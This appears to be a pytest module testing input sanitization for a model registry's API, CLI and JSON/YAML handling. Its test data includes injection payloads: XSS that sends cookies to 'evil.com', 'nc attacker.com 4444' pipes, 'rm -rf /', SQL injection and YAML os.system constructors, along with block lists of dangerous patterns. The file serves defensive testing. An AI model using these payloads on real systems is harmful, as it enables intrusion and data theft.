"""Comprehensive input sanitization testing for EMUSES Model Registry.

This module implements extensive testing of input sanitization across all interfaces
to ensure protection against injection attacks, XSS, and other input-based vulnerabilities.
Focuses on validating user inputs across CLI, API endpoints, and data processing.

Security Focus Areas:
- API endpoint input validation
- CLI parameter sanitization  
- File name and path sanitization
- JSON/YAML configuration validation
- Model metadata sanitization
- Search query sanitization
- User-generated content protection
"""

import pytest
import json
import yaml
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch
import re
import html
from uuid import uuid4

try:
    from fastapi.testclient import TestClient
    from fastapi import HTTPException
    FASTAPI_AVAILABLE = True
except ImportError:
    FASTAPI_AVAILABLE = False

from emuses.tools.local_model_registry import LocalModelRegistry


class TestAPIInputSanitization:
    """Test input sanitization for API endpoints."""
    
    @pytest.fixture
    def mock_registry(self):
        """Create mock registry for testing."""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield LocalModelRegistry(registry_path=Path(temp_dir))

    def test_model_name_sanitization(self, mock_registry):
        """Test model name input sanitization.
        
        Model names should be sanitized to prevent path traversal,
        XSS attacks, and filesystem manipulation.
        """
        malicious_names = [
            # Path traversal attempts
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            
            # XSS attempts
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Command injection attempts
            "model; rm -rf /",
            "model && cat /etc/passwd", 
            "model | nc attacker.com 4444",
            "model`whoami`",
            
            # SQL injection patterns
            "model'; DROP TABLE models; --",
            "model' OR '1'='1",
            "model' UNION SELECT * FROM users --",
            
            # Special characters and controls
            "model\x00\x01\x02",
            "model\r\n\t",
            "model with spaces and\nlinebreaks",
            "model/with/slashes",
            "model\\with\\backslashes",
            
            # Long inputs (buffer overflow attempts)
            "A" * 1000,
            "model" + "A" * 500,
            
            # Unicode and encoding attacks
            "mödël",  # Unicode
            "model%00",  # Null byte
            "model%0A%0D",  # CRLF injection
        ]
        
        for malicious_name in malicious_names:
            sanitized_name = self._sanitize_model_name(malicious_name)
            
            # Test path traversal protection
            assert ".." not in sanitized_name
            assert "/" not in sanitized_name
            assert "\\" not in sanitized_name
            
            # Test XSS protection
            assert "<script" not in sanitized_name.lower()
            assert "javascript:" not in sanitized_name.lower()
            assert "onerror=" not in sanitized_name.lower()
            assert "onload=" not in sanitized_name.lower()
            
            # Test command injection protection
            dangerous_chars = [";", "&", "|", "`", "$", "(", ")", "&&", "||"]
            assert not any(char in sanitized_name for char in dangerous_chars)
            
            # Test SQL injection protection
            sql_keywords = ["DROP", "SELECT", "UNION", "INSERT", "UPDATE", "DELETE"]
            assert not any(keyword in sanitized_name.upper() for keyword in sql_keywords)
            
            # Test control characters are removed
            control_chars = ["\x00", "\x01", "\x02", "\r", "\n", "\t"]
            assert not any(char in sanitized_name for char in control_chars)
            
            # Test length limits
            assert len(sanitized_name) <= 100  # Reasonable model name limit

    def test_model_description_sanitization(self, mock_registry):
        """Test model description input sanitization.
        
        Descriptions allow more content but must prevent XSS and injection.
        """
        malicious_descriptions = [
            # XSS in descriptions
            "This is a great model <script>steal_cookies()</script> for classification",
            "CNN model <img src=x onerror=fetch('//evil.com/'+document.cookie)>",
            "Deep learning model';alert('XSS');//",
            
            # Template injection
            "Model description {{7*7}} with template injection",
            "Description ${7*7} with expression injection",
            "Model with {{config.items()}} config leak",
            
            # HTML injection
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<form action='http://evil.com'><input type='submit'></form>",
            "<style>body{display:none}</style>",
            
            # Mixed content attacks
            "Legitimate description <script>evil()</script> continues here",
            "Good content<svg onload=alert('XSS')>more good content",
        ]
        
        for malicious_desc in malicious_descriptions:
            sanitized_desc = self._sanitize_model_description(malicious_desc)
            
            # Test XSS protection
            assert "<script" not in sanitized_desc.lower()
            assert "javascript:" not in sanitized_desc.lower()
            assert "onerror=" not in sanitized_desc.lower()
            assert "onload=" not in sanitized_desc.lower()
            assert "<iframe" not in sanitized_desc.lower()
            assert "<form" not in sanitized_desc.lower()
            assert "<style" not in sanitized_desc.lower()
            
            # Test template injection protection
            assert "{{" not in sanitized_desc
            assert "${" not in sanitized_desc
            assert "config.items()" not in sanitized_desc
            
            # Test legitimate content is preserved
            if "classification" in malicious_desc:
                assert "classification" in sanitized_desc
            if "CNN model" in malicious_desc:
                assert "CNN model" in sanitized_desc
            if "Deep learning" in malicious_desc:
                assert "Deep learning" in sanitized_desc

    def test_metadata_field_sanitization(self, mock_registry):
        """Test metadata field sanitization.
        
        Metadata can contain various data types and must be sanitized appropriately.
        """
        malicious_metadata = {
            # String fields with XSS
            "author": "Dr. Smith<script>alert('XSS')</script>",
            "institution": "MIT<img src=x onerror=alert('XSS')>",
            "contact": "researcher@example.com';alert('XSS');//",
            
            # URL fields with malicious content
            "paper_url": "javascript:alert('XSS')",
            "dataset_url": "ftp://evil.com/malware.exe",
            "homepage": "http://127.0.0.1:8080/admin",
            
            # Version strings with injection
            "version": "1.0; rm -rf /",
            "framework": "tensorflow`whoami`",
            
            # Numeric fields with string injection
            "accuracy": "0.95'; DROP TABLE models; --",
            "model_size": "100MB<script>alert('size')</script>",
            
            # Nested object injection
            "training_config": {
                "optimizer": "adam<script>alert('opt')</script>",
                "learning_rate": "0.001'; UPDATE users SET admin=true; --"
            },
            
            # Array injection
            "tags": [
                "ML",
                "<script>alert('tag')</script>",
                "vision'; DROP TABLE tags; --"
            ]
        }
        
        sanitized_metadata = self._sanitize_metadata(malicious_metadata)
        
        # Test string field sanitization
        assert "<script" not in str(sanitized_metadata).lower()
        assert "javascript:" not in str(sanitized_metadata).lower()
        assert "onerror=" not in str(sanitized_metadata).lower()
        
        # Test URL validation - malicious URLs should be removed or replaced
        if "paper_url" in sanitized_metadata:
            url_value = sanitized_metadata["paper_url"]
            # Either starts with safe protocol or was replaced with safe placeholder
            assert url_value.startswith(("http://", "https://")) or url_value == "invalid_url_removed"
        
        # Test command injection protection
        dangerous_chars = [";", "`", "&&", "||"]
        metadata_str = str(sanitized_metadata)
        assert not any(char in metadata_str for char in dangerous_chars)
        
        # Test SQL injection protection
        sql_keywords = ["DROP TABLE", "UPDATE", "INSERT", "DELETE"]
        assert not any(keyword in metadata_str.upper() for keyword in sql_keywords)
        
        # Test legitimate content preserved
        assert "Dr. Smith" in str(sanitized_metadata)
        assert "MIT" in str(sanitized_metadata)
        assert "researcher@example.com" in str(sanitized_metadata)

    def test_search_query_sanitization(self, mock_registry):
        """Test search query input sanitization.
        
        Search queries must prevent NoSQL injection and XSS in results.
        """
        malicious_queries = [
            # NoSQL injection attempts
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "function() { return true; }"},
            {"$ne": None},
            {"name": {"$regex": ".*password.*"}},
            
            # XSS in search terms
            "<script>alert('search')</script>",
            "javascript:alert('search')",
            "search<img src=x onerror=alert('XSS')>",
            
            # SQL injection patterns
            "'; DROP TABLE models; --",
            "' OR '1'='1",
            "' UNION SELECT password FROM users --",
            
            # Command injection
            "search; cat /etc/passwd",
            "search && rm -rf /",
            "search`whoami`",
            
            # Long query attacks
            "A" * 10000,
            {"name": "A" * 5000},
            
            # Binary data injection
            b"\x00\x01\x02malicious",
        ]
        
        for malicious_query in malicious_queries:
            sanitized_query = self._sanitize_search_query(malicious_query)
            
            if isinstance(sanitized_query, dict):
                # Test NoSQL injection protection
                for key in sanitized_query.keys():
                    assert not key.startswith("$"), f"MongoDB operator not allowed: {key}"
                
                # Test nested operators
                for value in sanitized_query.values():
                    if isinstance(value, dict):
                        for nested_key in value.keys():
                            assert not nested_key.startswith("$"), f"Nested operator not allowed: {nested_key}"
            
            elif isinstance(sanitized_query, str):
                # Test XSS protection
                assert "<script" not in sanitized_query.lower()
                assert "javascript:" not in sanitized_query.lower()
                assert "onerror=" not in sanitized_query.lower()
                
                # Test SQL injection protection
                sql_keywords = ["DROP", "UNION", "INSERT", "UPDATE", "DELETE"]
                assert not any(keyword in sanitized_query.upper() for keyword in sql_keywords)
                
                # Test command injection protection
                dangerous_chars = [";", "&", "`", "&&", "||"]
                assert not any(char in sanitized_query for char in dangerous_chars)
                
                # Test length limits
                assert len(sanitized_query) <= 1000

    def test_file_upload_sanitization(self, mock_registry):
        """Test file upload input sanitization.
        
        File uploads must validate names, extensions, and content.
        """
        malicious_filenames = [
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config",
            "file../../etc/passwd",
            
            # Executable extensions
            "model.exe",
            "model.bat",
            "model.sh",
            "model.py.exe",  # Double extension
            "model.scr",
            "model.com",
            
            # Null byte injection
            "model.pkl\x00.exe",
            "safe.pkl\0malicious.bat",
            
            # Unicode attacks
            "model.p\u0000kl",
            "mödel.pkl",
            
            # Long filenames
            "A" * 300 + ".pkl",
            
            # Special characters
            "model<script>.pkl",
            "model;rm-rf.pkl", 
            "model|whoami.pkl",
            "model`id`.pkl",
        ]
        
        for malicious_filename in malicious_filenames:
            sanitized_filename = self._sanitize_filename(malicious_filename)
            
            # Test path traversal protection
            assert ".." not in sanitized_filename
            assert "/" not in sanitized_filename
            assert "\\" not in sanitized_filename
            
            # Test dangerous extensions blocked
            dangerous_extensions = [".exe", ".bat", ".sh", ".scr", ".com", ".cmd"]
            for ext in dangerous_extensions:
                assert not sanitized_filename.lower().endswith(ext)
            
            # Test null byte protection
            assert "\x00" not in sanitized_filename
            assert "\0" not in sanitized_filename
            
            # Test special character removal
            dangerous_chars = ["<", ">", "|", ";", "&", "`", "$", "(", ")"]
            assert not any(char in sanitized_filename for char in dangerous_chars)
            
            # Test length limits
            assert len(sanitized_filename) <= 255

    def _sanitize_model_name(self, name):
        """Sanitize model name input."""
        if not isinstance(name, str):
            return ""
            
        # Remove control characters
        sanitized = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', name)
        
        # Remove path traversal
        sanitized = sanitized.replace('..', '').replace('/', '').replace('\\', '')
        
        # Remove HTML tags and attributes completely
        sanitized = re.sub(r'<[^>]*>', '', sanitized)
        
        # Remove JavaScript and dangerous event handlers
        sanitized = sanitized.replace('javascript:', '')
        sanitized = re.sub(r'on\w+\s*=', '', sanitized, flags=re.IGNORECASE)
        
        # Remove dangerous characters
        dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '"', "'", '=']
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        # Remove SQL keywords
        sql_patterns = [
            r'\bDROP\b', r'\bSELECT\b', r'\bUNION\b', 
            r'\bINSERT\b', r'\bUPDATE\b', r'\bDELETE\b'
        ]
        for pattern in sql_patterns:
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
        
        # Remove remaining whitespace between words and collapse
        sanitized = re.sub(r'\s+', ' ', sanitized)
        
        # Limit length and strip whitespace
        sanitized = sanitized.strip()[:100]
        
        return sanitized if sanitized else "unnamed_model"

    def _sanitize_model_description(self, description):
        """Sanitize model description input."""
        if not isinstance(description, str):
            return ""
            
        # Remove dangerous HTML tags completely
        dangerous_tags = [
            r'<script[^>]*>.*?</script>',
            r'<iframe[^>]*>.*?</iframe>',
            r'<form[^>]*>.*?</form>',
            r'<style[^>]*>.*?</style>',
            r'<object[^>]*>.*?</object>',
            r'<embed[^>]*>.*?</embed>'
        ]
        
        sanitized = description
        for tag_pattern in dangerous_tags:
            sanitized = re.sub(tag_pattern, '', sanitized, flags=re.IGNORECASE | re.DOTALL)
        
        # Remove any remaining HTML tags
        sanitized = re.sub(r'<[^>]*>', '', sanitized)
        
        # Remove dangerous characters BEFORE HTML encoding
        dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '"', "'"]
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        # Remove dangerous attributes and event handlers
        sanitized = re.sub(r'on\w+\s*=', '', sanitized, flags=re.IGNORECASE)
        sanitized = sanitized.replace('javascript:', '')
        
        # Remove template injection patterns
        sanitized = re.sub(r'\{\{.*?\}\}', '', sanitized)
        sanitized = re.sub(r'\$\{.*?\}', '', sanitized)
        
        # Remove specific dangerous patterns
        dangerous_patterns = [
            'document.cookie',
            'document.location', 
            'window.location',
            'eval(',
            'exec(',
            'rm -rf',
            'DROP TABLE',
            'UPDATE users',
            'INSERT INTO',
            'DELETE FROM'
        ]
        for pattern in dangerous_patterns:
            sanitized = sanitized.replace(pattern, '', )
        
        # Remove SQL patterns
        sql_patterns = [
            r'\bDROP\b.*?\bTABLE\b',
            r'\bUPDATE\b.*?\bSET\b',
            r'\bINSERT\b.*?\bINTO\b',
            r'\bDELETE\b.*?\bFROM\b'
        ]
        for pattern in sql_patterns:
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
        
        # HTML entity encode remaining content (but don't encode it if we already removed dangerous chars)
        # sanitized = html.escape(sanitized)
        
        return sanitized.strip()[:2000]

    def _sanitize_metadata(self, metadata):
        """Sanitize metadata dictionary recursively."""
        if isinstance(metadata, dict):
            sanitized = {}
            for key, value in metadata.items():
                # Sanitize key
                clean_key = self._sanitize_model_name(str(key))
                # Sanitize value recursively - handle URLs specially
                if key.endswith('_url') and isinstance(value, str):
                    # URL validation - only allow http/https
                    if value.startswith(('http://', 'https://')):
                        sanitized[clean_key] = value
                    else:
                        # Remove dangerous URL and replace with safe placeholder
                        sanitized[clean_key] = "invalid_url_removed"
                else:
                    sanitized[clean_key] = self._sanitize_metadata(value)
            return sanitized
        elif isinstance(metadata, list):
            return [self._sanitize_metadata(item) for item in metadata]
        elif isinstance(metadata, str):
            return self._sanitize_model_description(metadata)
        else:
            return metadata

    def _sanitize_search_query(self, query):
        """Sanitize search query input."""
        if isinstance(query, dict):
            # Remove NoSQL operators
            sanitized = {}
            for key, value in query.items():
                if not key.startswith('$'):
                    if isinstance(value, dict):
                        # Remove nested operators
                        clean_value = {k: v for k, v in value.items() if not k.startswith('$')}
                        if clean_value:
                            sanitized[key] = clean_value
                    else:
                        sanitized[key] = self._sanitize_search_query(value)
            return sanitized
        elif isinstance(query, str):
            # Apply more aggressive sanitization for search queries
            sanitized = query
            # Remove command injection
            dangerous_chars = [';', '&', '`', '&&', '||']
            for char in dangerous_chars:
                sanitized = sanitized.replace(char, '')
            # Remove SQL injection patterns
            sql_patterns = ['DROP', 'UNION', 'INSERT', 'UPDATE', 'DELETE']
            for pattern in sql_patterns:
                sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
            # Remove XSS patterns
            sanitized = re.sub(r'<[^>]*>', '', sanitized)
            sanitized = sanitized.replace('javascript:', '')
            return sanitized[:1000]
        elif isinstance(query, bytes):
            # Convert bytes to string and sanitize
            try:
                return self._sanitize_search_query(query.decode('utf-8', errors='ignore'))
            except:
                return ""
        else:
            return query

    def _sanitize_filename(self, filename):
        """Sanitize uploaded filename."""
        if not isinstance(filename, str):
            return "unnamed_file"
            
        # Remove null bytes
        sanitized = filename.replace('\x00', '').replace('\0', '')
        
        # Remove path traversal
        sanitized = sanitized.replace('..', '').replace('/', '').replace('\\', '')
        
        # Remove dangerous characters
        dangerous_chars = ['<', '>', '|', ';', '&', '`', '$', '(', ')', '"', "'"]
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        # Check extension whitelist
        allowed_extensions = ['.pkl', '.json', '.yaml', '.yml', '.h5', '.pt', '.pth', '.onnx']
        name_part, ext_part = sanitized.rsplit('.', 1) if '.' in sanitized else (sanitized, '')
        
        if ext_part and f'.{ext_part.lower()}' not in allowed_extensions:
            sanitized = name_part  # Remove dangerous extension
        
        # Limit length
        sanitized = sanitized[:255]
        
        return sanitized if sanitized else "unnamed_file"


class TestCLIInputSanitization:
    """Test CLI parameter input sanitization."""
    
    def test_cli_model_name_sanitization(self):
        """Test CLI model name parameter sanitization."""
        malicious_cli_inputs = [
            # Command injection through model names
            "model; rm -rf /",
            "model && cat /etc/passwd",
            "model | nc evil.com 4444", 
            "model`whoami`",
            
            # Path traversal
            "../../../etc/passwd",
            "model/../../etc/passwd",
            
            # Shell metacharacters
            "model$IFS$()cat$IFS/etc/passwd",
            "model${IFS}cat${IFS}/etc/passwd",
            
            # Argument injection
            "--help; rm -rf /",
            "-v; whoami",
            
            # Quote escaping
            "model'; rm -rf /",
            'model"; rm -rf /',
            "model\\'; rm -rf /",
        ]
        
        for malicious_input in malicious_cli_inputs:
            sanitized_input = self._sanitize_cli_parameter(malicious_input, "model_name")
            
            # Test command injection protection
            dangerous_chars = [';', '&', '|', '`', '$', '(', ')', "'", '"']
            assert not any(char in sanitized_input for char in dangerous_chars)
            
            # Test path traversal protection
            assert ".." not in sanitized_input
            assert "/" not in sanitized_input
            
            # Test shell metacharacter protection
            assert "IFS" not in sanitized_input
            assert "${" not in sanitized_input
            
            # Test argument injection protection
            assert not sanitized_input.startswith("-")

    def test_cli_path_parameter_sanitization(self):
        """Test CLI path parameter sanitization."""
        malicious_paths = [
            # Absolute path injection
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config",
            
            # Path traversal
            "../../../../../../etc/passwd",
            "..\\..\\..\\Windows\\System32",
            
            # Command injection in paths
            "/tmp/file; rm -rf /",
            "/tmp/file && whoami",
            "/tmp/file`id`",
            
            # URL-encoded traversal
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            
            # Null byte injection
            "/tmp/safe\x00/etc/passwd",
            "/tmp/safe\0dangerous",
        ]
        
        for malicious_path in malicious_paths:
            sanitized_path = self._sanitize_cli_parameter(malicious_path, "path")
            
            # Test absolute path protection
            assert not sanitized_path.startswith(("/", "C:\\"))
            
            # Test path traversal protection  
            assert ".." not in sanitized_path
            
            # Test command injection protection
            dangerous_chars = [';', '&', '|', '`']
            assert not any(char in sanitized_path for char in dangerous_chars)
            
            # Test null byte protection
            assert "\x00" not in sanitized_path
            assert "\0" not in sanitized_path

    def test_cli_config_parameter_sanitization(self):
        """Test CLI configuration parameter sanitization."""
        malicious_configs = [
            # JSON injection
            '{"key": "value", "evil": "$(rm -rf /)"}',
            '{"name": "test"; rm -rf /}',
            '{"config": {"nested": "value`whoami`"}}',
            
            # YAML injection
            "key: value\neval: !!python/object/apply:os.system ['rm -rf /']",
            "config:\n  name: test\n  cmd: !include /etc/passwd",
            
            # Command substitution
            "config_value$(whoami)",
            "value`id`more_value",
            
            # Code injection
            "__import__('os').system('rm -rf /')",
            "eval('print(1)')",
            "exec('import os; os.system(\"whoami\")')",
        ]
        
        for malicious_config in malicious_configs:
            sanitized_config = self._sanitize_cli_parameter(malicious_config, "config")
            
            # Test command substitution protection
            assert "$(" not in sanitized_config
            assert "`" not in sanitized_config
            
            # Test YAML injection protection
            assert "!!python" not in sanitized_config
            assert "!include" not in sanitized_config
            
            # Test code injection protection
            assert "__import__" not in sanitized_config
            assert "eval(" not in sanitized_config
            assert "exec(" not in sanitized_config

    def _sanitize_cli_parameter(self, param, param_type):
        """Sanitize CLI parameter based on type."""
        if not isinstance(param, str):
            return ""
            
        if param_type == "model_name":
            return self._sanitize_model_name_cli(param)
        elif param_type == "path":
            return self._sanitize_path_cli(param)
        elif param_type == "config":
            return self._sanitize_config_cli(param)
        else:
            return self._sanitize_generic_cli(param)

    def _sanitize_model_name_cli(self, name):
        """Sanitize model name for CLI usage."""
        # Remove dangerous characters for shell
        dangerous_chars = [';', '&', '|', '`', '$', '(', ')', "'", '"', '<', '>']
        sanitized = name
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        # Remove path traversal
        sanitized = sanitized.replace('..', '').replace('/', '')
        
        # Remove argument injection
        if sanitized.startswith('-'):
            sanitized = sanitized.lstrip('-')
        
        # Remove shell expansions and IFS patterns
        sanitized = re.sub(r'\$\{[^}]*\}', '', sanitized)
        sanitized = re.sub(r'\$\([^)]*\)', '', sanitized)
        sanitized = sanitized.replace('IFS', '')  # Remove IFS shell variable
        
        return sanitized.strip()[:100]

    def _sanitize_path_cli(self, path):
        """Sanitize path parameter for CLI usage."""
        # Remove null bytes
        sanitized = path.replace('\x00', '').replace('\0', '')
        
        # Remove path traversal
        sanitized = sanitized.replace('..', '')
        
        # Remove command injection
        dangerous_chars = [';', '&', '|', '`', '$']
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        # Convert to relative path if absolute
        if sanitized.startswith('/') or sanitized.startswith('C:\\'):
            sanitized = sanitized.lstrip('/').lstrip('C:\\')
        
        return sanitized.strip()[:500]

    def _sanitize_config_cli(self, config):
        """Sanitize configuration parameter."""
        # Remove command substitution
        sanitized = re.sub(r'\$\([^)]*\)', '', config)
        sanitized = re.sub(r'`[^`]*`', '', sanitized)
        
        # Remove dangerous YAML constructs
        yaml_patterns = [
            r'!!python[^}\s]*',
            r'!include[^}\s]*',
            r'!!map[^}\s]*',
            r'!!seq[^}\s]*'
        ]
        for pattern in yaml_patterns:
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
        
        # Remove code execution patterns
        code_patterns = [
            r'__import__\s*\(',
            r'eval\s*\(',
            r'exec\s*\(',
            r'compile\s*\(',
            r'open\s*\('
        ]
        for pattern in code_patterns:
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
        
        return sanitized.strip()[:2000]

    def _sanitize_generic_cli(self, param):
        """Generic CLI parameter sanitization."""
        # Remove command injection basics
        dangerous_chars = [';', '&', '|', '`']
        sanitized = param
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        return sanitized.strip()[:1000]


class TestJSONYAMLSanitization:
    """Test JSON/YAML configuration sanitization."""
    
    def test_json_injection_protection(self):
        """Test protection against JSON injection attacks."""
        malicious_json_strings = [
            # Code execution attempts
            '{"name": "__import__(\'os\').system(\'whoami\')"}',
            '{"config": "eval(\'print(1)\')"}',
            '{"script": "exec(\'import subprocess; subprocess.call([\\\"whoami\\\"])\')"}',
            
            # Prototype pollution attempts
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            
            # Large payload attacks
            '{"data": "' + 'A' * 100000 + '"}',
            
            # Nested injection
            '{"config": {"nested": {"cmd": "$(whoami)"}}}',
            
            # Unicode escapes
            '{"name": "\\u003cscript\\u003ealert(\'XSS\')\\u003c/script\\u003e"}',
        ]
        
        for malicious_json in malicious_json_strings:
            try:
                parsed = json.loads(malicious_json)
                sanitized = self._sanitize_json_data(parsed)
                
                # Test code execution protection
                json_str = json.dumps(sanitized)
                assert "__import__" not in json_str
                assert "eval(" not in json_str
                assert "exec(" not in json_str
                assert "subprocess" not in json_str
                
                # Test prototype pollution protection
                assert "__proto__" not in json_str
                assert "constructor" not in json_str or "prototype" not in json_str
                
                # Test command injection protection
                assert "$(" not in json_str
                assert "`" not in json_str
                
                # Test XSS protection
                assert "<script" not in json_str.lower()
                
            except json.JSONDecodeError:
                # Malformed JSON should be rejected
                pass

    def test_yaml_injection_protection(self):
        """Test protection against YAML injection attacks."""
        malicious_yaml_strings = [
            # Python code execution
            """
name: test
cmd: !!python/object/apply:os.system ['whoami']
            """,
            
            # File inclusion
            """
config: !include /etc/passwd
            """,
            
            # Arbitrary object construction
            """
data: !!python/object/new:subprocess.Popen
args: [['whoami']]
            """,
            
            # Module import
            """
evil: !!python/name:os.system
            """,
            
            # Nested dangerous constructs
            """
config:
  nested:
    cmd: !!python/object/apply:subprocess.call [['id']]
            """,
            
            # Custom tags
            """
data: !custom_tag
  script: whoami
            """,
        ]
        
        for malicious_yaml in malicious_yaml_strings:
            try:
                # Use safe_load instead of load to prevent code execution
                parsed = yaml.safe_load(malicious_yaml)
                if parsed:  # Only test if YAML was parsed
                    sanitized = self._sanitize_yaml_data(parsed)
                    
                    yaml_str = yaml.safe_dump(sanitized)
                    
                    # Test code execution protection
                    assert "!!python" not in yaml_str
                    assert "!include" not in yaml_str
                    assert "subprocess" not in yaml_str
                    assert "os.system" not in yaml_str
                    
                    # Test custom tag protection
                    assert "!custom_tag" not in yaml_str
                    
            except yaml.YAMLError:
                # Malformed YAML should be rejected
                pass

    def test_configuration_schema_validation(self):
        """Test configuration schema validation."""
        valid_configs = [
            {
                "registry_path": "/safe/path",
                "max_models": 100,
                "enable_analytics": True,
                "api_settings": {
                    "host": "localhost",
                    "port": 8000
                }
            },
            {
                "name": "model_name",
                "version": "1.0.0",
                "description": "Safe description",
                "tags": ["ml", "vision"]
            }
        ]
        
        invalid_configs = [
            # Invalid types
            {
                "max_models": "not_a_number",
                "enable_analytics": "not_a_boolean"
            },
            
            # Dangerous values
            {
                "registry_path": "../../../etc/passwd",
                "api_settings": {
                    "host": "127.0.0.1`whoami`",
                    "port": "8000; rm -rf /"
                }
            },
            
            # Missing required fields
            {
                "version": "1.0.0"
                # Missing name
            }
        ]
        
        for valid_config in valid_configs:
            validated_config = self._validate_config_schema(valid_config)
            assert validated_config is not None
        
        for invalid_config in invalid_configs:
            with pytest.raises((ValueError, TypeError)):
                self._validate_config_schema(invalid_config)

    def _sanitize_json_data(self, data):
        """Sanitize parsed JSON data."""
        if isinstance(data, dict):
            sanitized = {}
            for key, value in data.items():
                # Sanitize key
                if key not in ["__proto__", "constructor", "prototype"]:
                    clean_key = self._sanitize_string_value(str(key))
                    sanitized[clean_key] = self._sanitize_json_data(value)
            return sanitized
        elif isinstance(data, list):
            return [self._sanitize_json_data(item) for item in data]
        elif isinstance(data, str):
            return self._sanitize_string_value(data)
        else:
            return data

    def _sanitize_yaml_data(self, data):
        """Sanitize parsed YAML data."""
        if isinstance(data, dict):
            sanitized = {}
            for key, value in data.items():
                clean_key = self._sanitize_string_value(str(key))
                sanitized[clean_key] = self._sanitize_yaml_data(value)
            return sanitized
        elif isinstance(data, list):
            return [self._sanitize_yaml_data(item) for item in data]
        elif isinstance(data, str):
            return self._sanitize_string_value(data)
        else:
            return data

    def _sanitize_string_value(self, value):
        """Sanitize string values in configurations."""
        if not isinstance(value, str):
            return value
            
        # Remove code execution patterns more aggressively
        dangerous_patterns = [
            r'__import__.*?\(',
            r'eval.*?\(',
            r'exec.*?\(',
            r'subprocess[.\w]*',
            r'os\.system',
            r'\$\([^)]*\)',
            r'`[^`]*`',
        ]
        
        sanitized = value
        for pattern in dangerous_patterns:
            sanitized = re.sub(pattern, 'REMOVED', sanitized, flags=re.IGNORECASE)
        
        # Remove XSS patterns
        xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
        ]
        
        for pattern in xss_patterns:
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE | re.DOTALL)
        
        return sanitized.strip()

    def _validate_config_schema(self, config):
        """Validate configuration against expected schema."""
        if not isinstance(config, dict):
            raise TypeError("Configuration must be a dictionary")
        
        # Define expected types for common fields
        field_types = {
            "name": str,
            "version": str,
            "description": str,
            "max_models": int,
            "enable_analytics": bool,
            "tags": list,
            "registry_path": str,
            "api_settings": dict
        }
        
        # Validate field types - be more strict about invalid configs
        for field, expected_type in field_types.items():
            if field in config:
                if not isinstance(config[field], expected_type):
                    if field == "max_models" and isinstance(config[field], str):
                        # Special case - invalid type conversion attempt
                        raise TypeError(f"Field '{field}' must be of type {expected_type.__name__}, got string")
                    elif field == "enable_analytics" and isinstance(config[field], str):
                        # Special case - invalid boolean
                        raise TypeError(f"Field '{field}' must be of type {expected_type.__name__}, got string")
                    else:
                        raise TypeError(f"Field '{field}' must be of type {expected_type.__name__}")
        
        # Check for dangerous path values
        if "registry_path" in config and isinstance(config["registry_path"], str):
            if ".." in config["registry_path"] or config["registry_path"].startswith("/etc/"):
                raise ValueError("Invalid registry_path contains dangerous patterns")
        
        # Validate required fields for specific config types
        if "version" in config and "name" not in config:
            raise ValueError("Configuration with version must include name field")
        
        # Sanitize string fields
        for field, value in config.items():
            if isinstance(value, str):
                config[field] = self._sanitize_string_value(value)
        
        return config


if __name__ == "__main__":
    # Run tests if executed directly
    pytest.main([__file__, "-v"])